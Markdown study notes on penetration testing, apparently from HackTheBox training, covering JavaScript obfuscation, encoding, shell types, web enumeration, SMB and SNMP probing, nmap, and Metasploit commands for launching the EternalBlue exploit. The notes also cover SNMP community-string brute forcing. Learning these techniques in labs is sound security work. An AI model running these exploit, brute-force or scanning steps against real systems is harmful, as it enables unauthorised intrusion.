# Hacking Notes!
  - [Javascript obsfucation](#javascript-obsfucation)
  - [Network Requests](#network-requests)
  - [Shell](#shell)
  - [Web Enumeration](#web-enumeration)
  - [Tools: General](#tools-general)
  - [Tools: Nmap](#tools-nmap)

## Javascript obsfucation

Packing, ciphers, base64/hex/rot encoding

* A packer obfuscation tool usually attempts to convert all words and symbols of the code into a list or a dictionary and then refer to them using the (p,a,c,k,e,d) function to re-build the original code during execution. 
  - The (p,a,c,k,e,d) can be different from one packer to another. 
  - However, it usually contains a certain order in which the words and symbols of the original code were packed to know how to order them during execution.
* `eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5.4(\'3 2 1 0\');',6,6,'Module|Deobfuscation|JavaScript|HTB|log|console'.split('|'),0,{}))`
* [Obsfucator Tool](https://beautifytools.com/javascript-obfuscator.php)
* [A More Advanced Obsfucator Tool](https://obfuscator.io)
* [JSF - Really cool tool](http://www.jsfuck.com/)
* [JJ Encode](https://utf-8.jp/public/jjencode.html)
* [AA Encode](https://utf-8.jp/public/aaencode.html)

* [JSNice - code formatter tool](http://www.jsnice.org/)

* Base 64
  - Encode - `echo https://www.foo.com/ | base64`
  - Decode - `echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d`

* Hex
  - Encode - `echo https://www.foo.com/ | xxd -p`
  - Decode - `echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r`

* Ceaser/Rot13
  - Caesar cipher shifts each letter by a fixed number. E.g. Rot13 shifts letters by 13 places
  - Encode - `echo https://www.foo.com/ |  tr 'A-Za-z' 'N-ZA-Mn-za-m'`
  - Decode - `echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'`

* [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)


## Network Requests

* `curl http:/SERVER_IP:PORT/foo.php -X POST -d "payload=value"`

## Shell

* "Getting a shell"
  - This means that the target host has been exploited, and we have obtained shell-level access (typically bash or sh) and can run commands interactively as if we are sitting logged in to the host. A shell may be obtained by exploiting a web application or network/service vulnerability or obtaining credentials and logging into the target host remotely.

| Shell Type | Description |
| ----------- | ----------- |
| Reverse shell | Initiates a connection back to a "listener" on our attack box. |
| Bind shell | "Binds" to a specific port on the target host and waits for a connection from our attack box. |
| Web shell | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command. |

* Netcat
  - Primary usage is for connecting to shells.
  - Furthermore can be used to connect to any listening port and interact with the service running on that port.
  - `netcat 10.10.10.10 22 \n SSH-2.0-OpenSSH_8.4p1 Debian-3` -> here port 22 sent us its banner, stating that SSH is running on it.
    - This is called ==Banner Grabbing==

## Web Enumeration

* Gobuster
  - Allows for DNS, vhost and directory brute forcing, and other things like enumeration of public AWS S3 buckets
  - dirb common.txt
  - `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`
  - An HTTP status code of 200 reveals that the resource's request was successful,
  - 403 HTTP status code indicates that we are forbidden to access the resource,
  - A 301 status code indicates that we are being redirected, which is not a failure case.
  - Visiting http://10.10.10.121/wordpress in a browser reveals that WordPress is still in setup mode, which will allow us to gain remote code execution (RCE) on the server.
  - There also may be essential resources hosted on subdomains, such as admin panels or applications with additional functionality that could be exploited.
  - --> Use GoBuster to enumerate available subdomains of a given domain using the dns flag to specify DNS mode
  - `git clone https://github.com/danielmiessler/SecLists` -> `sudo apt install seclists -y` -> Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file -> `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`
* Banner Grabbing / Web Server Headers
  - Gives a good picture of what's hosted on a web server; they can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured.
  - `curl -IL https://www.inlanefreight.com`
  - Another handy tool is [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness), which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.

* Whatweb 
  - We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb
  - `whatweb 10.10.10.121`
  - `whatweb --no-errors 10.10.10.0/24`

* Certificates
  - SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. 

* Robots.txt
  - It is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing.
  - The robots.txt file can provide valuable information such as the location of private files and admin pages
  - `User-agent: *\nDisallow: /private`

* Source code
  - We can hit [CTRL + U] to bring up the source code window in a browser

  
## Public Exploits

* Google
* Searchsploit can be used to search for public vulnerabilities/exploits for any application
  - `sudo apt install exploitdb -y` -> e.g. `searchsploit openssh 7.2`
* Online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). 
  

* Metasploit
  - Metasploit Framework (MSF) contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets:
  - Running reconnaissance scripts to enumerate remote hosts and compromised targets.
  - Verification scripts to test the existence of a vulnerability without actually compromising the target.
  - Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets.
  - Many post-exploitation and pivoting tools.
  - `msfconsole`
  - `> search exploit eternalblue`
  - `> search cve:2009 type:exploit`
  - `> use exploit/windows/smb/ms17_010_psexec`
  - `> show options` displays the options available to configure. Any option with "Required" set to yes needs to be set for the exploit to work.
  - `> set RHOSTS 10.10.10.40`
  - `> set LHOST tun0`
  - Run `> check` to ensure the server is vulnerable:
  - Execute `> run` or `> exploit` to run the exploit.
  - Retired HackTheBox machines great for practising metasploit: Granny/Grandpa, Jerry, Blue, Lame, Optimum, Legacy, Devel

## Tools: General
****
* Burpsuite
* FoxyProxy
  - Browser extension that when configured, routes traffice through Burpsuite proxy
* tmux
  - [Tmux Cheat Sheet](https://tmuxcheatsheet.com/)
* vim
  - [Vim Cheat Sheet](https://vimsheet.com/)
  - 
| Command | Description |
| ----------- | ----------- |
| x | Cut character |
| dw | Cut word |
| dd | Cut full line |
| yw | Copy word |
| yy | Copy full line |
| p | Paste |
| x | Cut character |
| :1 | Go to line number 1 |
| :w | Write the file, save |
| :q | Quit |
| :q! | Quit without saving |
| wq | Write and quit |
* ftp
  - FTP supports common commands such as cd and ls and allows us to download files using the get command
  - `ftp -p 10.129.42.253`
  - Supports common commands such as `cd` and `ls` and allows us to download files using the `get` command.
  
* SMB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement.
  - Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as [EternalBlue](https://www.avast.com/c-eternalblue).
  - Nmap has many scripts for enumerating SMB, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), which will interact with the SMB service to extract the reported operating system version
  - *SMB allows users and administrators to share folders and make them accessible remotely by other users.*
  - A tool that can enumerate and interact with SMB shares is smbclient. 
  - The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.
  - `smbclient -N -L \\\\10.129.42.253`
  - 

* SNMP (Simple Network Management Protocol) is a networking protocol used for the management and monitoring of network-connected devices in Internet Protocol network.
  - The SNMP protocol is embedded in multiple local devices such as routers, switches, servers, firewalls, and wireless access points accessible using their IP address.
  - *SNMP provides a common mechanism for network devices to relay management information within single and multi-vendor LAN or WAN environments.*
  - It is an application layer protocol in the OSI model framework.
  - SNMP Community strings provide information and statistics about a router or device, helping us gain access to it.
  - The manufacturer default community strings of public and private are often unchanged. 
  -  In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. 
  - `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`

* A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo for the tool.
  - `snmpwalk -v 2c -c private  10.129.42.253`
  - `onesixtyone -c dict.txt 10.129.42.254`


## Tools: Nmap

* Service Scanner.
* Port numbers range from 1 to 65,535, with the range of well-known ports 1 to 1,023 being reserved for privileged services. 
  - Port 0 is a reserved port in TCP/IP networking and is not used in TCP or UDP messages. 
  - If anything attempts to bind to port 0 (such as a service), it will bind to the next available port above port 1,024 because port 0 is treated as a "wild card" port.
  - Port 3389 is the default port for Remote Desktop Services and is an excellent indication that the target is a Windows machine
  - Nmap output - "states" - sometimes we will see other ports listed that have a different state, such as **filtered**. This can happen if a firewall is only allowing access to the ports from specific addresses.
  - Port 22 (SSH) being available indicates that the target is running Linux/Unix, but this service can also be configured on Windows. 

* The web page title PHP 7.4.3 - phpinfo() indicates that this is a PHPInfo file, which is often manually created to confirm that PHP has been successfully installed.

* Use the -sC parameter to specify that Nmap scripts should be used to try and obtain more detailed information.
* The -sV parameter instructs Nmap to perform a version scan.
  - The version scan is underpinned by a comprehensive database of over 1,000 service signatures
* -p- tells Nmap that we want to scan all 65,535 TCP ports.
* -Pn ignores waiting for a ping back from the host and just search for services anyway.

* We could use [this](https://raw.githubusercontent.com/cyberstruggle/DeltaGroup/master/CVE-2019-19781/CVE-2019-19781.nse) Nmap script to audit for the severe Citrix NetScaler vulnerability ([CVE-2019–19781](https://www.rapid7.com/blog/post/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)), while Nmap also has other scripts to audit a Citrix installation.
* `nmap --script <script name> -p<port> <host>`
* Banner grabbing - `nmap -sV --script=banner <target>`
  - map -sV --script=banner -p21 10.10.10.0/24












| Syntax | Description |
| ----------- | ----------- |
| Header | Title |
| Paragraph | Text |